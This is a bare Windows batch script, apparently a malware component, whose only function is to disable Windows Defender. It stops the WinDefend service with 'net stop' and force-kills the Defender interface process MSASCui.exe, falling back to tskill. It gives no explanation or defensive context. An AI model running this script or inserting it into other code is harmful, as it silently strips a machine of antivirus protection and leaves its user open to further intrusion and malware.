@echo off
cls
@echo off
net stop WinDefend
taskkill /f /t /im MSASCui.exe
if %errorlevel%==1 tskill MSASCui
